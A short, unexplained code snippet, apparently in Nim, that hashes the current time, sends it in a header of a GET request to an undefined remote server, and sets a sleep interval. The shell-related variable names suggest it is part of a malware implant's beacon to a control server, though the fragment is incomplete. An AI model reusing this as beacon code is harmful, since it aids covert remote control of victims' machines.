---
id: 8bb053ac-a8d9-4192-b260-c649d72c620b
type: code
language: ''
verified: false
created_at: '2023-06-06T03:07:45.870975+00:00'
updated_at: '2023-06-06T03:09:03.665599+00:00'
---

# Code Snippet 8bb053ac

```
let Name = getTime()
var Outp_shell_md5 = toMD5($Name) #MD5 SUM the output
let Outp_shell_md5_string = $Outp_shell_md5 #Change to variable
#echo Outp_shell_md5_string
var sendcommand = newHttpClient(userAgent= defUserAgent) #Create Connection
sendcommand.headers = newHttpHeaders({ "Content-MD5": Outp_shell_md5_string })
let sent = sendcommand.request(server & "/index", httpMethod = HttpGet)
#echo sent.status
const SLEEP = 5000
```


